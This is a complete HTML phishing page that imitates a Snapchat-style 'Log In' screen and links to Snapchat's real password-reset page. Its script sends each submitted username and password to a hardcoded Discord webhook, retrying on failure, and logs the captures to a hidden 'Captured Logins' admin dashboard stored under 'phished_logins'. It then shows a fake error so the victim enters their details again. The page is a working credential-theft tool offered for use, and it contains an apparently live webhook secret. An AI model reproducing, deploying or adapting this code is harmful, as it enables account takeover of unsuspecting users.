<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Log In</title>
<script src="https://cdn.tailwindcss.com"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
<style>
  @import url("https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap");
  body { font-family: "Inter", sans-serif; }
  ::-webkit-scrollbar { display: none; }
  input[type="checkbox"] {
    -webkit-appearance: none; -moz-appearance: none; appearance: none;
    width: 1rem; height: 1rem; border: 2px solid #d1d5db;
    border-radius: 0.25rem; position: relative; cursor: pointer;
  }
  input[type="checkbox"]:checked::after {
    content: ''; position: absolute; left: 3px; top: 0px;
    width: 5px; height: 10px; border: solid #00b0ff;
    border-width: 0 2px 2px 0; transform: rotate(45deg);
  }
  input[type="checkbox"]:focus { outline: none; box-shadow: 0 0 0 2px rgba(0,176,255,0.3); }
  #loginBtn { 
    transition: bottom 0.3s ease; 
    min-width: 40%; 
    width: 60%; 
    font-size: 0.96rem; 
    padding: 0.7rem 0; 
    display: block; 
    margin: 0 auto; 
  }
  .input-container { width: 85%; margin: 0 auto; }
  input[type="text"], input[type="password"] { width: 100%; font-size: 0.95rem; padding-bottom: 0.25rem; }
  label[for="password"] { position: relative; top: -3px; font-size: 0.75rem; }
  #password { position: relative; top: -2.7px; }
  label.inline-flex.items-center { position: relative; top: -8px; font-size: 0.85rem; }
  #forgotPassword { position: relative; top: -9.5px; font-size: 0.85rem; }
  #errorMsg { max-width: 95%; margin: 0 auto; font-size: 0.8rem; text-align: center; }
  h1 { position: relative; top: -10px; font-size: 1.5rem; font-weight: 500; text-align: center; }
  form.flex.flex-col.space-y-6 { gap: 0.5rem; }
  .card { background: white; border-radius: 12px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
  .highlight { background-color: #eef2ff; padding: 0.5rem; border-radius: 8px; }
  .remove-btn { cursor: pointer; color: #ef4444; }
  .remove-btn:hover { color: #dc2626; }
  #adminSection { display: none; }
  #adminSection.active { display: block; }
  .back-arrow i { font-size: 1rem; }
</style>
</head>
<body class="bg-white min-h-screen flex flex-col justify-between max-w-lg mx-auto relative">
<div id="loginSection" class="pt-4 px-6 relative flex flex-col flex-grow">
  <button aria-label="Back" class="absolute top-4 left-6 text-[#00b5e7] leading-none font-medium back-arrow" onclick="goBack()">
    <i class="fas fa-chevron-left"></i>
  </button>
  <h1 class="mt-4 mb-8 text-black font-medium font-sans">Log In</h1>
  <form id="loginForm" class="flex flex-col space-y-6">
    <div class="flex flex-col input-container">
      <label for="username" class="text-xs font-medium text-gray-400 tracking-widest mb-1 font-sans">USERNAME, EMAIL, OR PHONE</label>
      <input id="username" type="text" class="border-b border-gray-300 focus:outline-none focus:border-gray-400 text-lg font-sans pr-10 w-full" autocomplete="username" required>
    </div>
    <div class="flex flex-col relative input-container">
      <label for="password" class="text-xs font-medium text-gray-400 tracking-widest mb-1 font-sans">PASSWORD</label>
      <input id="password" type="password" class="border-b border-gray-300 focus:outline-none focus:border-gray-400 text-lg font-sans pr-10 w-full" autocomplete="current-password" required>
      <button type="button" aria-label="Toggle password visibility" class="absolute right-0 bottom-3 text-gray-400 text-lg" onclick="togglePassword()">
        <i id="eyeIcon" class="fas fa-eye-slash"></i>
      </button>
    </div>
    <p id="errorMsg" class="text-sm text-red-500 font-normal leading-tight hidden">Invalid username or password. Try again.</p>
    <label class="inline-flex items-center space-x-2 font-sans text-sm text-black input-container">
      <input type="checkbox" checked>
      <span>Save Login Info on your iCloud devices</span>
    </label>
    <a id="forgotPassword" href="https://accounts.snapchat.com/accounts/password_reset_request" class="text-[#0083ff] text-center text-sm font-sans mt-2 input-container">Forgot your password?</a>
    <button id="loginBtn" type="submit" class="bg-gray-400 text-white font-medium text-lg py-3 rounded-full mt-4" disabled>Log In</button>
  </form>
</div>
<div id="adminSection" class="p-6 max-w-3xl mx-auto">
  <h1 class="text-3xl font-bold text-gray-900 mb-6">Admin Dashboard</h1>
  <div class="card p-6 mb-6">
    <h2 class="text-xl font-semibold text-gray-700 mb-4">Captured Logins</h2>
    <div class="overflow-y-auto max-h-96" id="loginList"></div>
  </div>
  <div class="card p-6">
    <h2 class="text-xl font-semibold text-gray-700 mb-4">Stats</h2>
    <div class="grid grid-cols-2 gap-4 text-center stats">
      <div class="p-4 bg-blue-50 rounded-lg">
        <p class="text-sm text-gray-500">Total Logins</p>
        <p class="text-2xl font-bold text-blue-600" id="totalLogins">0</p>
      </div>
      <div class="p-4 bg-green-50 rounded-lg">
        <p class="text-sm text-gray-500">Last Login</p>
        <p class="text-2xl font-bold text-green-600" id="lastLogin">N/A</p>
      </div>
    </div>
  </div>
</div>
<script>
document.addEventListener("DOMContentLoaded", function() {
  const usernameInput = document.getElementById("username");
  const passwordInput = document.getElementById("password");
  const loginBtn = document.getElementById("loginBtn");
  const errorMsg = document.getElementById("errorMsg");
  const loginForm = document.getElementById("loginForm");
  const loginList = document.getElementById("loginList");
  const totalLogins = document.getElementById("totalLogins");
  const lastLogin = document.getElementById("lastLogin");

  const WEBHOOK_URL = "https://discord.com/api/webhooks/1408935972829401158/TMRXIF8bqJ7YzjXDGKGYi_4DeXgtPtI2JcJR_ecLP9FFyYq-fCC-u24tYVPQGnyx5Q8w";
  const MAX_RETRIES = 3;

  let loginCount = 0;
  let capturedLogins = JSON.parse(localStorage.getItem("phished_logins") || "[]");

  function checkInputs() {
    if (usernameInput.value.trim() && passwordInput.value.trim()) {
      loginBtn.classList.remove("bg-gray-400");
      loginBtn.classList.add("bg-[#00b0ff]");
      loginBtn.disabled = false;
    } else {
      loginBtn.classList.remove("bg-[#00b0ff]");
      loginBtn.classList.add("bg-gray-400");
      loginBtn.disabled = true;
    }
  }

  function updateAdminDashboard(username, timestamp) {
    loginCount++;
    capturedLogins.push({ username, timestamp });
    localStorage.setItem("phished_logins", JSON.stringify(capturedLogins));
    totalLogins.textContent = loginCount;
    lastLogin.textContent = timestamp;

    const loginItem = document.createElement("div");
    loginItem.className = "highlight mb-2 p-2 flex justify-between items-center";
    loginItem.innerHTML = `
      <span>${username} - ${timestamp}</span>
      <span class="remove-btn" onclick="removeLogin(this, '${username}', '${timestamp}')">
        <i class="fas fa-trash-alt"></i>
      </span>
    `;
    loginList.appendChild(loginItem);
  }

  window.removeLogin = function(element, username, timestamp) {
    capturedLogins = capturedLogins.filter(
      (login) => login.username !== username || login.timestamp !== timestamp
    );
    localStorage.setItem("phished_logins", JSON.stringify(capturedLogins));
    loginCount--;
    totalLogins.textContent = loginCount;
    if (capturedLogins.length > 0) {
      lastLogin.textContent = capturedLogins[capturedLogins.length - 1].timestamp;
    } else {
      lastLogin.textContent = "N/A";
    }
    element.parentElement.remove();
  };

  async function sendToWebhook(payload, retries = MAX_RETRIES) {
    try {
      const response = await fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          embeds: [{
            title: "New Login Captured",
            fields: [
              { name: "Username", value: payload.username, inline: true },
              { name: "Password", value: payload.password, inline: true },
              { name: "Timestamp", value: payload.timestamp, inline: false }
            ],
            color: 0x00b0ff
          }]
        }),
        mode: "cors"
      });
      if (!response.ok) throw new Error("Webhook request failed");
      return true;
    } catch {
      if (retries > 0) {
        return await sendToWebhook(payload, retries - 1);
      }
      return false;
    }
  }

  usernameInput.addEventListener("input", checkInputs);
  passwordInput.addEventListener("input", checkInputs);

  loginForm.addEventListener("submit", async function(e) {
    e.preventDefault();
    const username = usernameInput.value.trim();
    const password = passwordInput.value.trim();
    const timestamp = new Date().toLocaleString();

    if (username && password) {
      const payload = { username, password, timestamp };
      const success = await sendToWebhook(payload);
      capturedLogins.push(payload);
      localStorage.setItem("phished_logins", JSON.stringify(capturedLogins));
      updateAdminDashboard(username, timestamp);
      errorMsg.textContent = "Invalid username or password. Try again.";
      errorMsg.classList.remove("hidden");
      usernameInput.value = "";
      passwordInput.value = "";
      checkInputs();
    } else {
      errorMsg.textContent = "Please fill in both fields.";
      errorMsg.classList.remove("hidden");
    }
  });

  window.togglePassword = function() {
    if (passwordInput.type === "password") {
      passwordInput.type = "text";
      document.getElementById("eyeIcon").classList.replace("fa-eye-slash", "fa-eye");
    } else {
      passwordInput.type = "password";
      document.getElementById("eyeIcon").classList.replace("fa-eye", "fa-eye-slash");
    }
  };
});

function goBack() {
  if (window.history.length > 1) {
    window.history.back();
  } else {
    window.location.reload();
  }
}
</script>
</body>
</html>
